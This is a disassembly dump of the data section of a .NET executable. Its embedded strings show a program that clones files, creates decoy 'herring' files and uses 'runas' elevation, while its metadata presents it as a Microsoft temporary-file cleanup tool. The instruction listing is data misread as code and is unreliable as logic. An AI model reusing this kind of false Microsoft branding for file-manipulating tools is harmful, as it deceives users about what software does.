   1400050ba:	00 01                	add    %al,(%rcx)
   1400050bc:	05 27 00 2e 00       	add    $0x2e0027,%eax
   1400050c1:	01 1b                	add    %ebx,(%rbx)
   1400050c3:	43 00 6c 00 6f       	add    %bpl,0x6f(%r8,%r8,1)
   1400050c8:	00 6e 00             	add    %ch,0x0(%rsi)
   1400050cb:	65 00 20             	add    %ah,%gs:(%rax)
   1400050ce:	00 46 00             	add    %al,0x0(%rsi)
   1400050d1:	61                   	(bad)
   1400050d2:	00 69 00             	add    %ch,0x0(%rcx)
   1400050d5:	6c                   	insb   (%dx),(%rdi)
   1400050d6:	00 75 00             	add    %dh,0x0(%rbp)
   1400050d9:	72 00                	jb     0x1400050db
   1400050db:	65 00 00             	add    %al,%gs:(%rax)
   1400050de:	3d 46 00 61 00       	cmp    $0x610046,%eax
   1400050e3:	69 00 6c 00 65 00    	imul   $0x65006c,(%rax),%eax
   1400050e9:	64 00 20             	add    %ah,%fs:(%rax)
   1400050ec:	00 74 00 6f          	add    %dh,0x6f(%rax,%rax,1)
   1400050f0:	00 20                	add    %ah,(%rax)
   1400050f2:	00 63 00             	add    %ah,0x0(%rbx)
   1400050f5:	72 00                	jb     0x1400050f7
   1400050f7:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   1400050fb:	74 00                	je     0x1400050fd
   1400050fd:	65 00 20             	add    %ah,%gs:(%rax)
   140005100:	00 61 00             	add    %ah,0x0(%rcx)
   140005103:	20 00                	and    %al,(%rax)
   140005105:	63 00                	movsxd (%rax),%eax
   140005107:	6c                   	insb   (%dx),(%rdi)
   140005108:	00 6f 00             	add    %ch,0x0(%rdi)
   14000510b:	6e                   	outsb  (%rsi),(%dx)
   14000510c:	00 65 00             	add    %ah,0x0(%rbp)
   14000510f:	20 00                	and    %al,(%rax)
   140005111:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   140005115:	72 00                	jb     0x140005117
   140005117:	20 00                	and    %al,(%rax)
   140005119:	27                   	(bad)
   14000511a:	00 01                	add    %al,(%rcx)
   14000511c:	1b 27                	sbb    (%rdi),%esp
   14000511e:	00 20                	add    %ah,(%rax)
   140005120:	00 77 00             	add    %dh,0x0(%rdi)
   140005123:	69 00 74 00 68 00    	imul   $0x680074,(%rax),%eax
   140005129:	20 00                	and    %al,(%rax)
   14000512b:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   14000512f:	72 00                	jb     0x140005131
   140005131:	6f                   	outsl  (%rsi),(%dx)
   140005132:	00 72 00             	add    %dh,0x0(%rdx)
   140005135:	20 00                	and    %al,(%rax)
   140005137:	01 17                	add    %edx,(%rdi)
   140005139:	2e 00 20             	cs add %ah,(%rax)
   14000513c:	00 41 00             	add    %al,0x0(%rcx)
   14000513f:	62                   	(bad)
   140005140:	00 6f 00             	add    %ch,0x0(%rdi)
   140005143:	72 00                	jb     0x140005145
   140005145:	74 00                	je     0x140005147
   140005147:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   14000514d:	21 00                	and    %eax,(%rax)
   14000514f:	00 0b                	add    %cl,(%rbx)
   140005151:	72 00                	jb     0x140005153
   140005153:	75 00                	jne    0x140005155
   140005155:	6e                   	outsb  (%rsi),(%dx)
   140005156:	00 61 00             	add    %ah,0x0(%rcx)
   140005159:	73 00                	jae    0x14000515b
   14000515b:	00 1f                	add    %bl,(%rdi)
   14000515d:	48 00 65 00          	rex.W add %spl,0x0(%rbp)
   140005161:	72 00                	jb     0x140005163
   140005163:	72 00                	jb     0x140005165
   140005165:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   14000516b:	20 00                	and    %al,(%rax)
   14000516d:	53                   	push   %rbx
   14000516e:	00 75 00             	add    %dh,0x0(%rbp)
   140005171:	63 00                	movsxd (%rax),%eax
   140005173:	63 00                	movsxd (%rax),%eax
   140005175:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140005179:	73 00                	jae    0x14000517b
   14000517b:	00 53 53             	add    %dl,0x53(%rbx)
   14000517e:	00 75 00             	add    %dh,0x0(%rbp)
   140005181:	63 00                	movsxd (%rax),%eax
   140005183:	63 00                	movsxd (%rax),%eax
   140005185:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   140005189:	73 00                	jae    0x14000518b
   14000518b:	66 00 75 00          	data16 add %dh,0x0(%rbp)
   14000518f:	6c                   	insb   (%dx),(%rdi)
   140005190:	00 6c 00 79          	add    %ch,0x79(%rax,%rax,1)
   140005194:	00 20                	add    %ah,(%rax)
   140005196:	00 63 00             	add    %ah,0x0(%rbx)
   140005199:	72 00                	jb     0x14000519b
   14000519b:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   14000519f:	74 00                	je     0x1400051a1
   1400051a1:	65 00 64 00 20       	add    %ah,%gs:0x20(%rax,%rax,1)
   1400051a6:	00 61 00             	add    %ah,0x0(%rcx)
   1400051a9:	20 00                	and    %al,(%rax)
   1400051ab:	68 00 65 00 72       	push   $0x72006500
   1400051b0:	00 72 00             	add    %dh,0x0(%rdx)
   1400051b3:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   1400051b9:	20 00                	and    %al,(%rax)
   1400051bb:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400051bf:	6c                   	insb   (%dx),(%rdi)
   1400051c0:	00 65 00             	add    %ah,0x0(%rbp)
   1400051c3:	20 00                	and    %al,(%rax)
   1400051c5:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   1400051c9:	72 00                	jb     0x1400051cb
   1400051cb:	20 00                	and    %al,(%rax)
   1400051cd:	27                   	(bad)
   1400051ce:	00 01                	add    %al,(%rcx)
   1400051d0:	1f                   	(bad)
   1400051d1:	48 00 65 00          	rex.W add %spl,0x0(%rbp)
   1400051d5:	72 00                	jb     0x1400051d7
   1400051d7:	72 00                	jb     0x1400051d9
   1400051d9:	69 00 6e 00 67 00    	imul   $0x67006e,(%rax),%eax
   1400051df:	20 00                	and    %al,(%rax)
   1400051e1:	46 00 61 00          	rex.RX add %r12b,0x0(%rcx)
   1400051e5:	69 00 6c 00 75 00    	imul   $0x75006c,(%rax),%eax
   1400051eb:	72 00                	jb     0x1400051ed
   1400051ed:	65 00 00             	add    %al,%gs:(%rax)
   1400051f0:	3b 8a 73 41 76 79    	cmp    0x79764173(%rdx),%ecx
   1400051f6:	71 42                	jno    0x14000523a
   1400051f8:	a7                   	cmpsl  (%rdi),(%rsi)
   1400051f9:	c0 1b 85             	rcrb   $0x85,(%rbx)
   1400051fc:	aa                   	stos   %al,(%rdi)
   1400051fd:	00 f6                	add    %dh,%dh
   1400051ff:	2e 00 04 20          	cs add %al,(%rax,%riz,1)
   140005203:	01 01                	add    %eax,(%rcx)
   140005205:	08 03                	or     %al,(%rbx)
   140005207:	20 00                	and    %al,(%rax)
   140005209:	01 05 20 01 01 11    	add    %eax,0x11010120(%rip)        # 0x15101532f
   14000520f:	11 04 20             	adc    %eax,(%rax,%riz,1)
   140005212:	01 01                	add    %eax,(%rcx)
   140005214:	0e                   	(bad)
   140005215:	04 20                	add    $0x20,%al
   140005217:	01 01                	add    %eax,(%rcx)
   140005219:	02 05 20 01 01 12    	add    0x12010120(%rip),%al        # 0x15201533f
   14000521f:	4d 03 20             	add    (%r8),%r12
   140005222:	00 02                	add    %al,(%rdx)
   140005224:	05 15 12 59 01       	add    $0x1591215,%eax
   140005229:	0e                   	(bad)
   14000522a:	04 20                	add    $0x20,%al
   14000522c:	00 13                	add    %dl,(%rbx)
   14000522e:	00 03                	add    %al,(%rbx)
   140005230:	20 00                	and    %al,(%rax)
   140005232:	1c 05                	sbb    $0x5,%al
   140005234:	15 12 55 01 0e       	adc    $0xe015512,%eax
   140005239:	08 20                	or     %ah,(%rax)
   14000523b:	00 15 12 59 01 13    	add    %dl,0x13015912(%rip)        # 0x15301ab53
   140005241:	00 04 20             	add    %al,(%rax,%riz,1)
   140005244:	00 12                	add    %dl,(%rdx)
   140005246:	7d 05                	jge    0x14000524d
   140005248:	00 00                	add    %al,(%rax)
   14000524a:	12 80 8d 03 20 00    	adc    0x20038d(%rax),%al
   140005250:	0e                   	(bad)
   140005251:	04 00                	add    $0x0,%al
   140005253:	01 0e                	add    %ecx,(%rsi)
   140005255:	0e                   	(bad)
   140005256:	03 00                	add    (%rax),%eax
   140005258:	00 0e                	add    %cl,(%rsi)
   14000525a:	06                   	(bad)
   14000525b:	00 03                	add    %al,(%rbx)
   14000525d:	0e                   	(bad)
   14000525e:	0e                   	(bad)
   14000525f:	0e                   	(bad)
   140005260:	0e                   	(bad)
   140005261:	04 00                	add    $0x0,%al
   140005263:	01 02                	add    %eax,(%rdx)
   140005265:	0e                   	(bad)
   140005266:	05 00 01 12 45       	add    $0x45120100,%eax
   14000526b:	0e                   	(bad)
   14000526c:	05 20 02 01 1c       	add    $0x1c010220,%eax
   140005271:	18 06                	sbb    %al,(%rsi)
   140005273:	20 01                	and    %al,(%rcx)
   140005275:	01 12                	add    %edx,(%rdx)
   140005277:	80 a1 05 00 00 1d 12 	andb   $0x12,0x1d000005(%rcx)
   14000527e:	45 08 07             	or     %r8b,(%r15)
   140005281:	02 15 12 59 01 0e    	add    0xe015912(%rip),%dl        # 0x14e01ab99
   140005287:	0e                   	(bad)
   140005288:	06                   	(bad)
   140005289:	00 01                	add    %al,(%rcx)
   14000528b:	0e                   	(bad)
   14000528c:	11 80 ad 05 15 12    	adc    %eax,0x121505ad(%rax)
   140005292:	49 01 0e             	add    %rcx,(%r14)
   140005295:	05 20 01 01 13       	add    $0x13010120,%eax
   14000529a:	00 11                	add    %dl,(%rcx)
   14000529c:	07                   	(bad)
   14000529d:	07                   	(bad)
   14000529e:	1d 12 45 1d 12       	sbb    $0x121d4512,%eax
   1400052a3:	45 08 12             	or     %r10b,(%r10)
   1400052a6:	45 1d 12 45 08 12    	rex.RB sbb $0x12084512,%eax
   1400052ac:	5d                   	pop    %rbp
   1400052ad:	05 20 01 02 13       	add    $0x13020120,%eax
   1400052b2:	00 04 20             	add    %al,(%rax,%riz,1)
   1400052b5:	01 03                	add    %eax,(%rbx)
   1400052b7:	08 04 06             	or     %al,(%rsi,%rax,1)
   1400052ba:	12 80 b5 07 20 02    	adc    0x22007b5(%rax),%al
   1400052c0:	12 80 b5 0e 02 05    	adc    0x5020eb5(%rax),%al
   1400052c6:	20 00                	and    %al,(%rax)
   1400052c8:	12 80 b9 05 20 02    	adc    0x22005b9(%rax),%al
   1400052ce:	1c 0e                	sbb    $0xe,%al
   1400052d0:	1c 05                	sbb    $0x5,%al
   1400052d2:	00 02                	add    %al,(%rdx)
   1400052d4:	02 0e                	add    (%rsi),%cl
   1400052d6:	0e                   	(bad)
   1400052d7:	06                   	(bad)
   1400052d8:	00 01                	add    %al,(%rcx)
   1400052da:	1d 12 45 0e 05       	sbb    $0x50e4512,%eax
   1400052df:	00 01                	add    %al,(%rcx)
   1400052e1:	0e                   	(bad)
   1400052e2:	1d 0e 04 00 01       	sbb    $0x100040e,%eax
   1400052e7:	01 08                	add    %ecx,(%rax)
   1400052e9:	10 07                	adc    %al,(%rdi)
   1400052eb:	07                   	(bad)
   1400052ec:	1d 12 61 08 12       	sbb    $0x12086112,%eax
   1400052f1:	61                   	(bad)
   1400052f2:	15 12 59 01 0e       	adc    $0xe015912,%eax
   1400052f7:	0e                   	(bad)
   1400052f8:	08 0e                	or     %cl,(%rsi)
   1400052fa:	05 00 00 1d 12       	add    $0x121d0000,%eax
   1400052ff:	61                   	(bad)
   140005300:	05 20 00 11 80       	add    $0x80110020,%eax
   140005305:	bd 05 20 00 12       	mov    $0x12002005,%ebp
   14000530a:	80 c1 04             	add    $0x4,%cl
   14000530d:	20 01                	and    %al,(%rcx)
   14000530f:	08 03                	or     %al,(%rbx)
   140005311:	04 20                	add    $0x20,%al
   140005313:	01 0e                	add    %ecx,(%rsi)
   140005315:	08 05 00 02 0e 0e    	or     %al,0xe0e0200(%rip)        # 0x14e0e551b
   14000531b:	0e                   	(bad)
   14000531c:	06                   	(bad)
   14000531d:	07                   	(bad)
   14000531e:	02 11                	add    (%rcx),%dl
   140005320:	65 11 69 05          	adc    %ebp,%gs:0x5(%rcx)
   140005324:	00 00                	add    %al,(%rax)
   140005326:	12 80 c5 09 00 03    	adc    0x30009c5(%rax),%al
   14000532c:	11 65 0e             	adc    %esp,0xe(%rbp)
   14000532f:	0e                   	(bad)
   140005330:	12 80 c9 04 00 00    	adc    0x4c9(%rax),%al
   140005336:	11 65 08             	adc    %esp,0x8(%rbp)
   140005339:	00 02                	add    %al,(%rdx)
   14000533b:	11 69 11             	adc    %ebp,0x11(%rcx)
   14000533e:	65 11 65 03          	adc    %esp,%gs:0x3(%rbp)
   140005342:	20 00                	and    %al,(%rax)
   140005344:	0d 11 07 08 0e       	or     $0xe080711,%eax
   140005349:	12 6d 08             	adc    0x8(%rbp),%ch
   14000534c:	1d 0e 0e 15 12       	sbb    $0x12150e0e,%eax
   140005351:	59                   	pop    %rcx
   140005352:	01 0e                	add    %ecx,(%rsi)
   140005354:	0e                   	(bad)
   140005355:	1d 05 05 00 00       	sbb    $0x505,%eax
   14000535a:	12 80 cd 06 20 01    	adc    0x12006cd(%rax),%al
   140005360:	01 12                	add    %edx,(%rdx)
   140005362:	80 cd 06             	or     $0x6,%ch
   140005365:	20 01                	and    %al,(%rcx)
   140005367:	02 11                	add    (%rcx),%dl
   140005369:	80 d5 05             	adc    $0x5,%ch
   14000536c:	20 02                	and    %al,(%rdx)
   14000536e:	01 0e                	add    %ecx,(%rsi)
   140005370:	1c 05                	sbb    $0x5,%al
   140005372:	20 02                	and    %al,(%rdx)
   140005374:	08 08                	or     %cl,(%rax)
   140005376:	08 05 20 01 01 1d    	or     %al,0x1d010120(%rip)        # 0x15d01549c
   14000537c:	05 06 00 02 01       	add    $0x1020006,%eax
   140005381:	0e                   	(bad)
   140005382:	1d 05 0d 00 04       	sbb    $0x4000d05,%eax
   140005387:	11 80 e9 0e 0e 11    	adc    %eax,0x110e0ee9(%rax)
   14000538d:	80 ed 11             	sub    $0x11,%ch
   140005390:	80 f1 04             	xor    $0x4,%cl
   140005393:	07                   	(bad)
   140005394:	01 11                	add    %edx,(%rcx)
   140005396:	65 04 20             	gs add $0x20,%al
   140005399:	01 0e                	add    %ecx,(%rsi)
   14000539b:	0e                   	(bad)
   14000539c:	04 07                	add    $0x7,%al
   14000539e:	02 08                	add    (%rax),%cl
   1400053a0:	0e                   	(bad)
   1400053a1:	06                   	(bad)
   1400053a2:	20 01                	and    %al,(%rcx)
   1400053a4:	12 80 b5 0e 04 20    	adc    0x20040eb5(%rax),%al
   1400053aa:	01 1c 0e             	add    %ebx,(%rsi,%rcx,1)
   1400053ad:	06                   	(bad)
   1400053ae:	20 01                	and    %al,(%rcx)
   1400053b0:	1d 0e 1d 03 0a       	sbb    $0xa031d0e,%eax
   1400053b5:	10 01                	adc    %al,(%rcx)
   1400053b7:	01 08                	add    %ecx,(%rax)
   1400053b9:	15 12 55 01 1e       	adc    $0x1e015512,%eax
   1400053be:	00 04 0a             	add    %al,(%rdx,%rcx,1)
   1400053c1:	01 12                	add    %edx,(%rdx)
   1400053c3:	45 0b 07             	or     (%r15),%r8d
   1400053c6:	07                   	(bad)
   1400053c7:	0e                   	(bad)
   1400053c8:	12 6d 1d             	adc    0x1d(%rbp),%ch
   1400053cb:	0e                   	(bad)
   1400053cc:	0e                   	(bad)
   1400053cd:	0e                   	(bad)
   1400053ce:	08 03                	or     %al,(%rbx)
   1400053d0:	05 00 01 1d 0e       	add    $0xe1d0100,%eax
   1400053d5:	0e                   	(bad)
   1400053d6:	03 20                	add    (%rax),%esp
   1400053d8:	00 08                	add    %cl,(%rax)
   1400053da:	06                   	(bad)
   1400053db:	00 03                	add    %al,(%rbx)
   1400053dd:	01 0e                	add    %ecx,(%rsi)
   1400053df:	0e                   	(bad)
   1400053e0:	02 0e                	add    (%rsi),%cl
   1400053e2:	07                   	(bad)
   1400053e3:	08 08                	or     %cl,(%rax)
   1400053e5:	0e                   	(bad)
   1400053e6:	0e                   	(bad)
   1400053e7:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
   1400053ec:	5d                   	pop    %rbp
   1400053ed:	08 12                	or     %dl,(%rdx)
   1400053ef:	5d                   	pop    %rbp
   1400053f0:	05 00 01 1d 05       	add    $0x51d0100,%eax
   1400053f5:	0e                   	(bad)
   1400053f6:	06                   	(bad)
   1400053f7:	00 01                	add    %al,(%rcx)
   1400053f9:	11 80 fd 0e 07 00    	adc    %eax,0x70efd(%rax)
   1400053ff:	02 01                	add    (%rcx),%al
   140005401:	0e                   	(bad)
   140005402:	11 80 fd 04 00 01    	adc    %eax,0x10004fd(%rax)
   140005408:	01 0e                	add    %ecx,(%rsi)
   14000540a:	07                   	(bad)
   14000540b:	00 01                	add    %al,(%rcx)
   14000540d:	12 45 12             	adc    0x12(%rbp),%al
   140005410:	81 01 03 00 00 08    	addl   $0x8000003,(%rcx)
   140005416:	0a 07                	or     (%rdi),%al
   140005418:	06                   	(bad)
   140005419:	08 1d 0e 0e 1d 0e    	or     %bl,0xe1d0e0e(%rip)        # 0x14e1d622d
   14000541f:	08 0e                	or     %cl,(%rsi)
   140005421:	06                   	(bad)
   140005422:	15 12 80 85 01       	adc    $0x1858012,%eax
   140005427:	0e                   	(bad)
   140005428:	06                   	(bad)
   140005429:	00 02                	add    %al,(%rdx)
   14000542b:	1d 0e 0e 0e 04       	sbb    $0x40e0e0e,%eax
   140005430:	07                   	(bad)
   140005431:	01 12                	add    %edx,(%rdx)
   140005433:	0c 08                	or     $0x8,%al
   140005435:	b7 7a                	mov    $0x7a,%bh
   140005437:	5c                   	pop    %rsp
   140005438:	56                   	push   %rsi
   140005439:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   14000543c:	89 01                	mov    %eax,(%rcx)
   14000543e:	00 02                	add    %al,(%rdx)
   140005440:	06                   	(bad)
   140005441:	02 02                	add    (%rdx),%al
   140005443:	06                   	(bad)
   140005444:	0e                   	(bad)
   140005445:	04 06                	add    $0x6,%al
   140005447:	1d 12 45 06 06       	sbb    $0x6064512,%eax
   14000544c:	15 12 49 01 0e       	adc    $0xe014912,%eax
   140005451:	02 06                	add    (%rsi),%al
   140005453:	08 07                	or     %al,(%rdi)
   140005455:	06                   	(bad)
   140005456:	15 12 80 85 01       	adc    $0x1858012,%eax
   14000545b:	0e                   	(bad)
   14000545c:	03 06                	add    (%rsi),%eax
   14000545e:	1d 0e 05 00 01       	sbb    $0x100050e,%eax
   140005463:	01 1d 0e 09 00 02    	add    %ebx,0x200090e(%rip)        # 0x142005d77
   140005469:	15 12 55 01 0e       	adc    $0xe015512,%eax
   14000546e:	0e                   	(bad)
   14000546f:	0e                   	(bad)
   140005470:	03 00                	add    (%rax),%eax
   140005472:	00 01                	add    %al,(%rcx)
   140005474:	05 00 02 01 0e       	add    $0xe010200,%eax
   140005479:	02 07                	add    (%rdi),%al
   14000547b:	00 03                	add    %al,(%rbx)
   14000547d:	01 0e                	add    %ecx,(%rsi)
   14000547f:	0e                   	(bad)
   140005480:	11 71 07             	adc    %esi,0x7(%rcx)
   140005483:	20 00                	and    %al,(%rax)
   140005485:	15 12 59 01 0e       	adc    $0xe015912,%eax
   14000548a:	03 28                	add    (%rax),%ebp
   14000548c:	00 0e                	add    %cl,(%rsi)
   14000548e:	03 28                	add    (%rax),%ebp
   140005490:	00 1c 08             	add    %bl,(%rax,%rcx,1)
   140005493:	01 00                	add    %eax,(%rax)
   140005495:	08 00                	or     %al,(%rax)
   140005497:	00 00                	add    %al,(%rax)
   140005499:	00 00                	add    %al,(%rax)
   14000549b:	1e                   	(bad)
   14000549c:	01 00                	add    %eax,(%rax)
   14000549e:	01 00                	add    %eax,(%rax)
   1400054a0:	54                   	push   %rsp
   1400054a1:	02 16                	add    (%rsi),%dl
   1400054a3:	57                   	push   %rdi
   1400054a4:	72 61                	jb     0x140005507
   1400054a6:	70 4e                	jo     0x1400054f6
   1400054a8:	6f                   	outsl  (%rsi),(%dx)
   1400054a9:	6e                   	outsb  (%rsi),(%dx)
   1400054aa:	45 78 63             	rex.RB js 0x140005510
   1400054ad:	65 70 74             	gs jo  0x140005524
   1400054b0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   1400054b7:	77 73                	ja     0x14000552c
   1400054b9:	01 08                	add    %ecx,(%rax)
   1400054bb:	01 00                	add    %eax,(%rax)
   1400054bd:	02 00                	add    (%rax),%al
   1400054bf:	00 00                	add    %al,(%rax)
   1400054c1:	00 00                	add    %al,(%rax)
   1400054c3:	19 01                	sbb    %eax,(%rcx)
   1400054c5:	00 14 4d 53 20 54 65 	add    %dl,0x65542053(,%rcx,2)
   1400054cc:	6d                   	insl   (%dx),(%rdi)
   1400054cd:	70 20                	jo     0x1400054ef
   1400054cf:	46 69 6c 65 20 43 6c 	imul   $0x61656c43,0x20(%rbp,%r12,2),%r13d
   1400054d6:	65 61 
   1400054d8:	6e                   	outsb  (%rsi),(%dx)
   1400054d9:	75 70                	jne    0x14000554b
   1400054db:	00 00                	add    %al,(%rax)
   1400054dd:	3e 01 00             	ds add %eax,(%rax)
   1400054e0:	39 41 75             	cmp    %eax,0x75(%rcx)
   1400054e3:	74 6f                	je     0x140005554
   1400054e5:	6d                   	insl   (%dx),(%rdi)
   1400054e6:	61                   	(bad)
   1400054e7:	74 69                	je     0x140005552
   1400054e9:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   1400054ec:	6c                   	insb   (%dx),(%rdi)
   1400054ed:	79 20                	jns    0x14000550f
   1400054ef:	63 6c 65 61          	movsxd 0x61(%rbp,%riz,2),%ebp
   1400054f3:	6e                   	outsb  (%rsi),(%dx)
   1400054f4:	73 20                	jae    0x140005516
   1400054f6:	74 65                	je     0x14000555d
   1400054f8:	6d                   	insl   (%dx),(%rdi)
   1400054f9:	70 6f                	jo     0x14000556a
   1400054fb:	72 61                	jb     0x14000555e
   1400054fd:	72 79                	jb     0x140005578
   1400054ff:	20 66 69             	and    %ah,0x69(%rsi)
   140005502:	6c                   	insb   (%dx),(%rdi)
   140005503:	65 73 20             	gs jae 0x140005526
   140005506:	74 68                	je     0x140005570
   140005508:	61                   	(bad)
   140005509:	74 20                	je     0x14000552b
   14000550b:	61                   	(bad)
   14000550c:	72 65                	jb     0x140005573
   14000550e:	20 6e 6f             	and    %ch,0x6f(%rsi)
   140005511:	74 20                	je     0x140005533
   140005513:	69 6e 20 75 73 65 2e 	imul   $0x2e657375,0x20(%rsi),%ebp
   14000551a:	00 00                	add    %al,(%rax)
   14000551c:	05 01 00 00 00       	add    $0x1,%eax
   140005521:	00 0e                	add    %cl,(%rsi)
   140005523:	01 00                	add    %eax,(%rax)
   140005525:	09 4d 69             	or     %ecx,0x69(%rbp)
   140005528:	63 72 6f             	movsxd 0x6f(%rdx),%esi
   14000552b:	73 6f                	jae    0x14000559c
   14000552d:	66 74 00             	data16 je 0x140005530
   140005530:	00 20                	add    %ah,(%rax)
   140005532:	01 00                	add    %eax,(%rax)
   140005534:	1b 43 6f             	sbb    0x6f(%rbx),%eax
   140005537:	70 79                	jo     0x1400055b2
   140005539:	72 69                	jb     0x1400055a4
   14000553b:	67 68 74 20 c2 a9    	addr32 push $0xffffffffa9c22074
   140005541:	20 4d 69             	and    %cl,0x69(%rbp)
   140005544:	63 72 6f             	movsxd 0x6f(%rdx),%esi
   140005547:	73 6f                	jae    0x1400055b8
   140005549:	66 74 20             	data16 je 0x14000556c
   14000554c:	32 30                	xor    (%rax),%dh
   14000554e:	32 34 00             	xor    (%rax,%rax,1),%dh
   140005551:	00 29                	add    %ch,(%rcx)
   140005553:	01 00                	add    %eax,(%rax)
   140005555:	24 39                	and    $0x39,%al
   140005557:	66 32 33             	data16 xor (%rbx),%dh
   14000555a:	66 36 61             	data16 ss (bad)
   14000555d:	36 2d 62 38 66 31    	ss sub $0x31663862,%eax
   140005563:	2d 34 31 35 33       	sub    $0x33353134,%eax
   140005568:	2d 62 66 35 36       	sub    $0x36356662,%eax
   14000556d:	2d 61 37 62 35       	sub    $0x35623761,%eax
   140005572:	37                   	(bad)
   140005573:	31 64 39 31          	xor    %esp,0x31(%rcx,%rdi,1)
   140005577:	62 39 62 00 00       	(bad)
   14000557c:	0c 01                	or     $0x1,%al
   14000557e:	00 07                	add    %al,(%rdi)
   140005580:	31 2e                	xor    %ebp,(%rsi)
   140005582:	30 2e                	xor    %ch,(%rsi)
   140005584:	30 2e                	xor    %ch,(%rsi)
   140005586:	30 00                	xor    %al,(%rax)
   140005588:	00 4d 01             	add    %cl,0x1(%rbp)
   14000558b:	00 1c 2e             	add    %bl,(%rsi,%rbp,1)
   14000558e:	4e                   	rex.WRX
   14000558f:	45 54                	rex.RB push %r12
   140005591:	46 72 61             	rex.RX jb 0x1400055f5
   140005594:	6d                   	insl   (%dx),(%rdi)
   140005595:	65 77 6f             	gs ja  0x140005607
   140005598:	72 6b                	jb     0x140005605
   14000559a:	2c 56                	sub    $0x56,%al
   14000559c:	65 72 73             	gs jb  0x140005612
   14000559f:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%rdi),%ebp
   1400055a6:	37                   	(bad)
   1400055a7:	2e 32 01             	cs xor (%rcx),%al
   1400055aa:	00 54 0e 14          	add    %dl,0x14(%rsi,%rcx,1)
   1400055ae:	46 72 61             	rex.RX jb 0x140005612
   1400055b1:	6d                   	insl   (%dx),(%rdi)
   1400055b2:	65 77 6f             	gs ja  0x140005624
   1400055b5:	72 6b                	jb     0x140005622
   1400055b7:	44 69 73 70 6c 61 79 	imul   $0x4e79616c,0x70(%rbx),%r14d
   1400055be:	4e 
   1400055bf:	61                   	(bad)
   1400055c0:	6d                   	insl   (%dx),(%rdi)
   1400055c1:	65 14 2e             	gs adc $0x2e,%al
   1400055c4:	4e                   	rex.WRX
   1400055c5:	45 54                	rex.RB push %r12
   1400055c7:	20 46 72             	and    %al,0x72(%rsi)
   1400055ca:	61                   	(bad)
   1400055cb:	6d                   	insl   (%dx),(%rdi)
   1400055cc:	65 77 6f             	gs ja  0x14000563e
   1400055cf:	72 6b                	jb     0x14000563c
   1400055d1:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
   1400055d4:	37                   	(bad)
   1400055d5:	2e 32 23             	cs xor (%rbx),%ah
   1400055d8:	01 00                	add    %eax,(%rax)
   1400055da:	1e                   	(bad)
   1400055db:	47 72 61             	rex.RXB jb 0x14000563f
   1400055de:	6e                   	outsb  (%rsi),(%dx)
   1400055df:	6f                   	outsl  (%rsi),(%dx)
   1400055e0:	6c                   	insb   (%dx),(%rdi)
   1400055e1:	61                   	(bad)
   1400055e2:	2e 50                	cs push %rax
   1400055e4:	72 6f                	jb     0x140005655
   1400055e6:	67 72 61             	addr32 jb 0x14000564a
   1400055e9:	6d                   	insl   (%dx),(%rdi)
   1400055ea:	2b 3c 47             	sub    (%rdi,%rax,2),%edi
   1400055ed:	65 74 46             	gs je  0x140005636
   1400055f0:	69 6c 65 73 3e 64 5f 	imul   $0x5f5f643e,0x73(%rbp,%riz,2),%ebp
   1400055f7:	5f 
   1400055f8:	35 00 00 04 01       	xor    $0x1040000,%eax
	...
   140005609:	00 00                	add    %al,(%rax)
   14000560b:	00 10                	add    %dl,(%rax)
	...
